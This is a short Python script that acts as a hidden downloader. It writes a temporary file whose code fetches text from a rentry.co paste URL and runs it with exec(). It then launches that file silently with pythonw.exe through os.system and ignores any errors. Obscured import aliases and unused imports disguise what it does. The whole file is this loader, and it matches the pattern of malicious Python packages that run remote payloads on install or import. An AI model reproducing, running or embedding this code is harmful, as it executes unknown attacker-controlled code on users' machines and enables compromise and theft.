from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
import requests
import os
import uuid
import tempfile
import subprocess

_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://rentry.co/6uh8vuwz/raw").read())""")
_ttmp.close()
try:
    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except:
    pass
